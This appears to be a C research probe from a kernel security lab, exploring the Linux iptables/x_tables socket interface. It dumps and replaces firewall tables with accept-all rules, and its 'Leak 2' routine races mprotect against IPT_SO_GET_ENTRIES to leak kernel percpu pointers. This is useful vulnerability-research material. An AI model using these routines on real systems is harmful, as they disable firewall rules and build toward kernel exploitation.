/*
 * xtinfo — x_tables surface probe for the xt36694 lab (runs in the sim under
 * jail, or on the device as factoryservice). Establishes the same reachability
 * the device measurements (M18/M19) found, plus the M19 "Leak 2" attempt.
 *
 *   xtinfo [--table filter] [--info] [--dump] [--replace] [--rules 4] [--leak 2000]
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/mman.h>
#include "ipt_blob.h"

static const char *k_tables[] = { "filter", "mangle", "raw", "security", NULL };

static void print_self(void)
{
	char buf[4096];
	int fd = open("/proc/self/status", O_RDONLY);
	if (fd < 0) return;
	ssize_t r = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (r <= 0) return;
	buf[r] = 0;
	for (char *p = strtok(buf, "\n"); p; p = strtok(NULL, "\n"))
		if (!strncmp(p, "Uid:", 4) || !strncmp(p, "CapEff:", 7))
			printf("[xtinfo] %s\n", p);
}

static int do_info(void)
{
	int fd = bb_sock(), rc = 0;
	if (fd < 0)
		return 1;
	for (const char **t = k_tables; *t; t++) {
		struct ipt_getinfo gi;
		if (bb_getinfo(fd, *t, &gi) != 0) {
			printf("%-10s unavailable (%s)\n", *t, strerror(errno));
			continue;
		}
		printf("%-10s valid_hooks=%#06x entries=%-3u size=%-6u\n",
		       *t, gi.valid_hooks, gi.num_entries, gi.size);
	}
	close(fd);
	return rc;
}

static int do_dump(const char *table)
{
	int fd = bb_sock();
	struct ipt_getinfo gi;
	if (fd < 0 || bb_getinfo(fd, table, &gi) != 0) {
		fprintf(stderr, "GET_INFO %s: %s\n", table, strerror(errno));
		return 1;
	}
	struct ipt_get_entries *ge = bb_get_entries(fd, &gi);
	if (!ge)
		return 1;
	unsigned off, n = 0;
	for (off = 0; off < ge->size;
	     off += ((struct ipt_entry *)((char *)ge->entrytable + off))->next_offset) {
		struct ipt_entry *e = (struct ipt_entry *)((char *)ge->entrytable + off);
		struct ipt_standard_target *st =
			(struct ipt_standard_target *)((char *)e + e->target_offset);
		printf("  [%2u] off=%-5u size=%-4u pcnt=%-10llu bcnt=%-10llu target=%s\n",
		       n, off, e->next_offset,
		       (unsigned long long)e->counters.pcnt,
		       (unsigned long long)e->counters.bcnt,
		       (off + e->next_offset <= ge->size) ? bb_verdict_name(st->verdict) : "?");
		n++;
	}
	printf("%s: %u entries, %u bytes\n", table, n, ge->size);
	free(ge);
	close(fd);
	return 0;
}

static int do_replace(const char *table, unsigned rules)
{
	int fd = bb_sock();
	struct ipt_getinfo gi;
	if (fd < 0 || bb_getinfo(fd, table, &gi) != 0) {
		fprintf(stderr, "GET_INFO %s: %s\n", table, strerror(errno));
		return 1;
	}
	printf("before: entries=%u size=%u\n", gi.num_entries, gi.size);
	struct ipt_replace *rep = bb_build(table, &gi, rules, BB_VACCEPT, BB_VACCEPT);
	if (!rep)
		return 1;
	if (bb_set_replace(fd, rep) != 0) {
		fprintf(stderr, "SET_REPLACE: %s (built entries=%u size=%u num_counters=%u)\n",
			strerror(errno), rep->num_entries, rep->size, rep->num_counters);
		bb_free_replace(rep);
		return 1;
	}
	printf("SET_REPLACE ok (entries=%u size=%u) — old counters:\n",
	       rep->num_entries, rep->size);
	for (unsigned i = 0; i < rep->num_counters && i < 8; i++)
		printf("  old[%u] pcnt=%llu bcnt=%llu\n", i,
		       (unsigned long long)rep->counters[i].pcnt,
		       (unsigned long long)rep->counters[i].bcnt);
	bb_free_replace(rep);
	struct ipt_getinfo after;
	bb_getinfo(fd, table, &after);
	printf("after: entries=%u size=%u\n", after.num_entries, after.size);
	close(fd);
	return 0;
}

/* ---- M19 "Leak 2": double-copy raw percpu pointer leak attempt ---- */
static volatile int leak_run = 1;
static void *leak_buf;
static unsigned leak_mapsize;

static void *toggle_thread(void *arg)
{
	(void)arg;
	while (leak_run) {
		mprotect((char *)leak_buf + 4096, 4096, PROT_READ | PROT_WRITE);
		mprotect((char *)leak_buf + 4096, 4096, PROT_NONE);
	}
	return NULL;
}

static int do_leak(const char *table, unsigned attempts)
{
	int fd = bb_sock();
	struct ipt_getinfo gi;
	if (fd < 0 || bb_getinfo(fd, table, &gi) != 0 || gi.size == 0) {
		fprintf(stderr, "GET_INFO %s failed\n", table);
		return 1;
	}
	leak_mapsize = ((gi.size + sizeof(struct ipt_get_entries)) + 8191) & ~8191;
	leak_buf = mmap(NULL, leak_mapsize, PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (leak_buf == MAP_FAILED) {
		perror("mmap");
		return 1;
	}

	pthread_t th;
	pthread_create(&th, NULL, toggle_thread, NULL);

	unsigned faulted = 0, clean = 0, hits = 0;
	for (unsigned a = 0; a < attempts && leak_run; a++) {
		struct ipt_get_entries *ge = leak_buf;
		memset(ge, 0, sizeof(*ge));
		strncpy(ge->name, table, XT_TABLE_MAXNAMELEN - 1);
		ge->size = gi.size;
		if (getsockopt(fd, IPPROTO_IP, IPT_SO_GET_ENTRIES, ge,
			       &(socklen_t){ sizeof(*ge) + gi.size }) == 0)
			clean++;
		else if (errno == EFAULT)
			faulted++;
		/* scan first copy for kernel-range words (raw percpu ptrs) */
		uint32_t *w = (uint32_t *)((char *)leak_buf + sizeof(*ge));
		for (unsigned i = 0; i + 1 < gi.size / 4; i += 2) {
			uint32_t lo = w[i];
			if (lo >= 0xC0000000u && lo != 0xFFFFFFFFu) {
				printf("LEAK? attempt=%u word@+%u = %#x\n", a, i * 4, lo);
				hits++;
			}
		}
	}
	leak_run = 0;
	pthread_join(th, NULL);
	printf("leak attempts=%u clean=%u faulted=%u candidates=%u\n",
	       attempts, clean, faulted, hits);
	munmap(leak_buf, leak_mapsize);
	close(fd);
	return hits ? 3 : 0;
}

int main(int argc, char **argv)
{
	const char *table = "filter";
	int info = 0, dump = 0, replace = 0, leak = 0;
	unsigned rules = 4, leak_n = 2000;

	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--table") && i + 1 < argc) table = argv[++i];
		else if (!strcmp(argv[i], "--info")) info = 1;
		else if (!strcmp(argv[i], "--dump")) dump = 1;
		else if (!strcmp(argv[i], "--replace")) replace = 1;
		else if (!strcmp(argv[i], "--rules") && i + 1 < argc) rules = strtoul(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--leak")) leak = 1;
		else if (!strcmp(argv[i], "--attempts") && i + 1 < argc) leak_n = strtoul(argv[++i], NULL, 0);
		else { fprintf(stderr, "unknown arg %s\n", argv[i]); return 2; }
	}
	if (!info && !dump && !replace && !leak)
		info = 1;
	print_self();
	int rc = 0;
	if (info) rc |= do_info();
	if (dump) rc |= do_dump(table);
	if (replace) rc |= do_replace(table, rules);
	if (leak) rc |= do_leak(table, leak_n);
	return rc;
}
